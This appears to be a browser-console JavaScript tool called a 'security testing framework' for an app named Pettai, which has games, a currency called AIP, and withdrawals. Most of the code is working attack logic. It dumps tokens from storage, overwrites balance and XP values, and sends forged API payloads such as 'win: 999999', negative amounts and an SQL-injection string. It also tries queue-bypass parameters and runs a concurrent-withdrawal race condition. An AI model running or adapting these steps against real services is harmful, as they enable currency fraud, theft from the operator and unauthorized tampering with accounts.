// == Pettai Security Testing Framework ==
class PettaiSecurityTester {
    constructor() {
        this.baseUrl = window.location.origin;
        this.testResults = [];
        this.interceptActive = false;
        
        // Setup request interception
        this.setupRequestInterception();
        console.log('%cPettai Security Testing Framework Initialized', 'color: green; font-weight: bold;');
        console.log('Run tests with: tester.runAllTests()');
    }
    
    // Utility functions
    logResult(testName, status, details = '') {
        const result = {
            test: testName,
            status: status, // pass/fail/warn
            details: details,
            timestamp: new Date().toISOString()
        };
        this.testResults.push(result);
        console.log(`[${status.toUpperCase()}] ${testName}: ${details}`);
    }
    
    async delay(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
    }
    
    // Setup request interception for manipulation
    setupRequestInterception() {
        const originalFetch = window.fetch;
        window.fetch = (...args) => {
            if (this.interceptActive) {
                // Log outgoing requests
                console.log('Intercepted Request:', args);
                
                // Modify request bodies if needed
                if (args[1] && args[1].body) {
                    try {
                        let body = args[1].body;
                        if (typeof body === 'string') {
                            console.log('Request Body:', body);
                        }
                    } catch (e) {
                        console.log('Could not parse request body:', e);
                    }
                }
            }
            return originalFetch.apply(window, args);
        };
    }
    
    // Test 1: Inspect localStorage and sessionStorage for sensitive data
    testClientSideStorage() {
        console.group('=== Client-Side Storage Inspection ===');
        try {
            const storageLocations = [
                {name: 'localStorage', storage: localStorage},
                {name: 'sessionStorage', storage: sessionStorage}
            ];
            
            let foundSensitiveData = false;
            storageLocations.forEach(location => {
                console.log(`Inspecting ${location.name}:`);
                Object.keys(location.storage).forEach(key => {
                    const value = location.storage.getItem(key);
                    console.log(`  ${key}: ${value.substring(0, 100)}${value.length > 100 ? '...' : ''}`);
                    
                    // Look for sensitive keys
                    const sensitiveKeys = ['token', 'auth', 'jwt', 'balance', 'aip', 'xp', 'coin', 'point'];
                    if (sensitiveKeys.some(sk => key.toLowerCase().includes(sk))) {
                        foundSensitiveData = true;
                        this.logResult(
                            'Sensitive Data in Client Storage',
                            'warn',
                            `Found '${key}' in ${location.name}`
                        );
                        
                        // Try to manipulate currency values
                        if (['balance', 'aip', 'xp', 'coin', 'point'].some(k => key.toLowerCase().includes(k))) {
                            try {
                                const oldValue = value;
                                const newValue = (parseFloat(value) * 10 || 999999).toString();
                                location.storage.setItem(key, newValue);
                                this.logResult(
                                    'Client-Side Value Manipulation',
                                    'warn',
                                    `Changed ${key} from ${oldValue} to ${newValue}. Refresh page to test persistence.`
                                );
                            } catch (e) {
                                console.log(`Could not manipulate ${key}:`, e.message);
                            }
                        }
                    }
                });
            });
            
            if (!foundSensitiveData) {
                this.logResult('Client-Side Storage', 'pass', 'No obviously sensitive data found');
            }
        } catch (e) {
            this.logResult('Client-Side Storage', 'fail', `Error during inspection: ${e.message}`);
        }
        console.groupEnd();
    }
    
    // Test 2: Inspect global variables for sensitive data
    testGlobalVariables() {
        console.group('=== Global Variables Inspection ===');
        try {
            const suspiciousGlobals = [];
            Object.keys(window).forEach(key => {
                // Skip common non-sensitive globals
                const commonGlobals = [
                    'location', 'navigator', 'fetch', 'document', 
                    'console', 'localStorage', 'sessionStorage',
                    'window', 'self', 'globalThis'
                ];
                
                if (!commonGlobals.includes(key)) {
                    const value = window[key];
                    if (typeof value === 'object' && value !== null) {
                        // Look for Redux-like stores
                        if (key.includes('store') || key.includes('state')) {
                            suspiciousGlobals.push(key);
                            console.log(`Potential state object found: ${key}`, value);
                        }
                    } else if (typeof value === 'string' && value.length > 20) {
                        // Long strings might be tokens
                        suspiciousGlobals.push(key);
                        console.log(`Long string variable: ${key}`, value.substring(0, 50) + '...');
                    }
                }
            });
            
            if (suspiciousGlobals.length > 0) {
                this.logResult(
                    'Suspicious Global Variables',
                    'warn',
                    `Found ${suspiciousGlobals.length} potentially sensitive global variables`
                );
            } else {
                this.logResult('Global Variables', 'pass', 'No obvious sensitive globals found');
            }
        } catch (e) {
            this.logResult('Global Variables', 'fail', `Error during inspection: ${e.message}`);
        }
        console.groupEnd();
    }
    
    // Test 3: Analyze network traffic patterns
    async testNetworkActivity() {
        console.group('=== Network Activity Analysis ===');
        this.interceptActive = true;
        this.logResult('Network Interception', 'info', 'Starting request interception. Perform actions in the app...');
        
        // Allow 30 seconds to perform various actions
        await this.delay(30000);
        
        this.interceptActive = false;
        this.logResult('Network Interception', 'info', 'Stopped request interception');
        console.groupEnd();
    }
    
    // Test 4: Manipulate game parameters before submission
    testGameParameterManipulation() {
        console.group('=== Game Parameter Manipulation Test ===');
        
        // Hook common game functions if they exist
        const gameMethods = ['play', 'submit', 'spin', 'guess', 'open'];
        
        gameMethods.forEach(method => {
            if (window[method]) {
                const originalMethod = window[method];
                window[method] = function(...args) {
                    console.log(`Hooked ${method} called with:`, args);
                    // Modify arguments here if needed for testing
                    return originalMethod.apply(this, args);
                };
                this.logResult(
                    'Function Hooking',
                    'info',
                    `Hooked global function: ${method}`
                );
            }
        });
        
        // Also monitor for XMLHttpRequest and Fetch patterns related to games
        const originalXHROpen = XMLHttpRequest.prototype.open;
        XMLHttpRequest.prototype.open = function(method, url) {
            if (url.includes('game') || url.includes('play') || url.includes('spin')) {
                console.log('Game-related XHR detected:', method, url);
            }
            return originalXHROpen.apply(this, arguments);
        };
        
        const originalFetch = window.fetch;
        window.fetch = function(input, init) {
            const url = typeof input === 'string' ? input : input.url;
            if (url.includes('game') || url.includes('play') || url.includes('spin')) {
                console.log('Game-related Fetch detected:', url, init);
            }
            return originalFetch.apply(this, arguments);
        };
        
        this.logResult(
            'Game Parameter Monitoring',
            'info',
            'Setup hooks for game-related function calls'
        );
        console.groupEnd();
    }
    
    // Test 5: Attempt direct API calls to manipulate data
    async testDirectAPICalls() {
        console.group('=== Direct API Testing ===');
        
        // Common API endpoint patterns
        const apiEndpoints = [
            '/api/user/balance',
            '/api/game/slot/play',
            '/api/game/door/open',
            '/api/game/wordle/guess',
            '/api/rewards/claim',
            '/api/withdraw',
            '/api/queue/jump'
        ];
        
        // Common methods to test with various payloads
        const testPayloads = [
            { amount: 999999 },           // Large amount
            { amount: -100 },             // Negative amount
            { amount: "1000'; DROP TABLE" }, // SQL injection attempt
            { bet: 0, win: 999999 },     // Game result manipulation
            { xp: 999999 },              // XP manipulation
            { aip: 999999 }              // AIP manipulation
        ];
        
        for (const endpoint of apiEndpoints) {
            for (const method of ['GET', 'POST']) {
                try {
                    // First, try unauthorized request
                    const response1 = await fetch(this.baseUrl + endpoint, {
                        method: method
                    });
                    console.log(`${method} ${endpoint} (no auth):`, response1.status);
                    
                    // If POST, try with payloads
                    if (method === 'POST') {
                        for (const payload of testPayloads) {
                            try {
                                const response2 = await fetch(this.baseUrl + endpoint, {
                                    method: method,
                                    headers: {
                                        'Content-Type': 'application/json'
                                    },
                                    body: JSON.stringify(payload)
                                });
                                
                                const resultText = await response2.text();
                                console.log(`${method} ${endpoint} with ${JSON.stringify(payload)}:`, response2.status, resultText.substring(0, 200));
                                
                                // Look for indicators of success
                                if (response2.status === 200 && (resultText.includes('success') || resultText.includes('balance'))) {
                                    this.logResult(
                                        'Potential API Bypass',
                                        'warn',
                                        `${method} ${endpoint} accepted unusual payload: ${JSON.stringify(payload)}`
                                    );
                                }
                            } catch (e) {
                                console.log(`Error testing ${endpoint}:`, e.message);
                            }
                            
                            // Small delay to avoid rate limiting
                            await this.delay(500);
                        }
                    }
                } catch (e) {
                    console.log(`Error accessing ${endpoint}:`, e.message);
                }
            }
        }
        
        console.groupEnd();
    }
    
    // Test 6: Race condition in withdrawal systems
    async testWithdrawalRaceCondition(amount = 100) {
        console.group('=== Withdrawal Race Condition Test ===');
        
        // Submit multiple withdrawal requests simultaneously
        const withdrawalRequests = [];
        const concurrentAttempts = 5;
        
        console.log(`Attempting ${concurrentAttempts} concurrent withdrawals of ${amount} AIP`);
        
        for (let i = 0; i < concurrentAttempts; i++) {
            withdrawalRequests.push(
                fetch(this.baseUrl + '/api/withdraw', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        amount: amount
                    })
                }).catch(err => ({ error: err.message }))
            );
        }
        
        const results = await Promise.all(withdrawalRequests);
        
        console.log('Withdrawal race results:', results);
        
        let successCount = 0;
        results.forEach((result, index) => {
            if (result.error) {
                console.log(`Request ${index+1}: Failed (${result.error})`);
            } else if (result.status === 200) {
                console.log(`Request ${index+1}: Success (Status: ${result.status})`);
                successCount++;
            } else {
                console.log(`Request ${index+1}: Status ${result.status}`);
            }
        });
        
        if (successCount > 1) {
            this.logResult(
                'Withdrawal Race Condition',
                'warn',
                `Multiple withdrawal requests succeeded (${successCount}/${concurrentAttempts}). Possible race condition.`
            );
        } else {
            this.logResult(
                'Withdrawal Race Condition',
                'pass',
                'No evidence of race condition'
            );
        }
        
        console.groupEnd();
    }
    
    // Test 7: Queue jumping bypass
    async testQueueBypass() {
        console.group('=== Queue Jumping Bypass Test ===');
        
        // First, check current queue status
        try {
            const statusResponse = await fetch(this.baseUrl + '/api/queue/status');
            const status = await statusResponse.json();
            console.log('Current queue status:', status);
            
            // Try direct redemption without queue jumping
            const directRedeemAttempt = await fetch(this.baseUrl + '/api/withdraw/redeem', {
                method: 'POST'
            });
            
            console.log('Direct redeem attempt:', directRedeemAttempt.status);
            
            if (directRedeemAttempt.status === 200) {
                this.logResult(
                    'Queue Bypass Vulnerability',
                    'warn',
                    'Direct redemption possible without queue jumping'
                );
            } else {
                this.logResult(
                    'Queue Bypass Test',
                    'info',
                    `Direct redemption failed as expected (Status: ${directRedeemAttempt.status})`
                );
            }
            
            // Try various parameter manipulations
            const bypassPayloads = [
                { action: 'redeem', bypass: true },
                { action: 'redeem', skipQueue: true },
                { action: 'redeem', instant: true },
                { action: 'jump', amount: 0 },
                { action: 'jump', free: true }
            ];
            
            for (const payload of bypassPayloads) {
                try {
                    const response = await fetch(this.baseUrl + '/api/queue/bypass', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify(payload)
                    });
                    
                    console.log(`Bypass attempt ${JSON.stringify(payload)}:`, response.status);
                    
                    if (response.status === 200) {
                        const resultText = await response.text();
                        this.logResult(
                            'Queue Bypass Vulnerability',
                            'warn',
                            `Potential bypass method found with payload: ${JSON.stringify(payload)}`
                        );
                        console.log('Response:', resultText.substring(0, 200));
                    }
                } catch (e) {
                    console.log(`Error with bypass payload ${JSON.stringify(payload)}:`, e.message);
                }
            }
        } catch (e) {
            this.logResult(
                'Queue Bypass Test',
                'fail',
                `Could not check queue status: ${e.message}`
            );
        }
        
        console.groupEnd();
    }
    
    // Test 8: Predictable randomness in games
    async testGamePredictability() {
        console.group('=== Game Predictability Test ===');
        
        // This test requires you to manually play several rounds of each game
        console.log('Instructions:');
        console.log('1. Start playing the Slot game repeatedly and observe the results');
        console.log('2. Record at least 20 outcomes');
        console.log('3. Check if there are any patterns (e.g., same sequence repeating)');
        
        this.logResult(
            'Game Predictability Test',
            'info',
            'Manual observation required. Play games multiple times and watch for patterns.'
        );
        
        // Set up monitoring for random values
        Math._originalRandom = Math.random;
        Math.random = function() {
            const value = Math._originalRandom();
            console.log(`Math.random() called: ${value}`);
            return value;
        };
        
        this.logResult(
            'Random Number Monitoring',
            'info',
            'Monitoring all calls to Math.random() during gameplay'
        );
        
        console.groupEnd();
    }
    
    // Run all tests sequentially
    async runAllTests() {
        console.clear();
        console.log('%cStarting Comprehensive Security Testing...', 'font-size: 16px; color: blue;');
        
        // Execute all tests
        this.testClientSideStorage();
        await this.delay(1000);
        
        this.testGlobalVariables();
        await this.delay(1000);
        
        // Note: This test requires manual interaction
        console.log('%cPlease interact with the app normally for the next 30 seconds...', 'color: orange;');
        await this.testNetworkActivity();
        await this.delay(1000);
        
        this.testGameParameterManipulation();
        await this.delay(1000);
        
        await this.testDirectAPICalls();
        await this.delay(1000);
        
        // Only run if you have AIP to withdraw (use small amount)
        // await this.testWithdrawalRaceCondition(10);  // Use small test amount
        await this.delay(1000);
        
        await this.testQueueBypass();
        await this.delay(1000);
        
        this.testGamePredictability();
        await this.delay(1000);
        
        // Summary
        console.group('=== TEST SUMMARY ===');
        console.table(this.testResults);
        console.groupEnd();
        
        console.log('%cTesting Complete!', 'font-size: 16px; color: green;');
        console.log('Check the console output for potential issues to report.');
    }
    
    // Export results
    exportResults() {
        const resultsBlob = new Blob([JSON.stringify(this.testResults, null, 2)], {type: 'application/json'});
        const url = URL.createObjectURL(resultsBlob);
        const a = document.createElement('a');
        a.href = url;
        a.download = 'pettai-security-test-results.json';
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
        URL.revokeObjectURL(url);
        
        console.log('Results exported to pettai-security-test-results.json');
    }
}

// Initialize the tester
const tester = new PettaiSecurityTester();

// Available commands:
// tester.runAllTests() - Runs all security tests
// tester.exportResults() - Exports test results to JSON file
// tester.testClientSideStorage() - Tests client storage vulnerabilities
// tester.testDirectAPICalls() - Tests direct API call vulnerabilities
